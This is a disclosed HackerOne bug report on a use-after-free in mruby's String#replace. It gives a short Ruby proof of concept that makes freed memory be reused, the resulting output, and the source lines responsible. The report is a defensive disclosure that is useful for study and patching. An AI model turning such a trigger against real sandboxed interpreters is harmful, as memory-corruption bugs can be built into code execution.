# Use After Free in str_replace

## Report Details
- **Report ID**: 193143
- **URL**: https://hackerone.com/reports/193143
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-21T18:03:59.324Z
- **Disclosed**: 2017-01-31T04:35:48.615Z

## Reporter
- **Username**: tunz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
#PoC
```ruby
$a = "A"*50
$a.replace($a)
$b = "B"*50
puts $a
```

#Output
```
$ ./bin/mruby test6.rb
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

The output should be "AAA...", but it prints "BBB...".

#Cause
`$a` is freed in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L523
and, the pointer is assigned to the same pointer in https://github.com/mruby/mruby/blob/5e3077c00da721ede78c07d2f2e261aded74e7b6/src/string.c#L531



## Attachments
No attachments
